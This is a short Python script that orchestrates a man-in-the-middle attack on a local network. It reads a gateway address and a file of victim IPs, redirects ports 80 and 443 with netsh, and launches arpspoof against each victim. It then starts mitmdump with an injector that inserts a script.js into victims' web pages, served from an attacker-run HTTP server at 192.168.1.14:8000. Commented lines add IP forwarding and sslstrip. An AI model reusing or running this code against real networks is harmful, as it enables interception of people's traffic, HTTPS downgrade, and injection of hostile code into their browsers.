# -*- coding: utf-8 -*-
import os
import sys
import subprocess

#get gateway_ip (router)
gateway = sys.argv[1]
print("[*]gateway: " + gateway)
# get victims_ip
victims = [line.rstrip('\n') for line in open("victims.txt")]
print("[*]victims:")
print(victims)

# configure routing (IPTABLES)
#os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
#os.system("iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE")
#设置重定向
os.system("netsh interface portproxy add v4tov4 listenport=80 connectaddress=0.0.0.0 connectport=8080")
os.system("netsh interface portproxy add v4tov4 listenport=443 connectaddress=0.0.0.0 connectport=8080")
#netsh interface portproxy delete v4tov4 listenport=80

# run the arpspoof for each victim, each one in a new console
for victim in victims:
    #os.system("py -3 arpspoof.py"+" "+ '-i '+ """ "Intel(R) Dual Band Wireless-AC 3160" """+ '-t ' + victim + " "+ "-g " + gateway)
    subprocess.Popen("py -3 arpspoof.py"+" "+ '-i '+ """ "Intel(R) Dual Band Wireless-AC 3160" """+ '-t ' + victim + " "+ "-g " + gateway)


print("[*]arpspoof Ok!")

# start the mitmproxy
subprocess.Popen("""mitmdump -T -s "injector.py -p http://192.168.1.14:8000/script.js" """)

# start the http server for serving the script.js, in a new console
os.system("py -3 httpServer.py")


'''
# run sslstrip
os.system("xterm -e sslstrip -l 8080 &")
'''
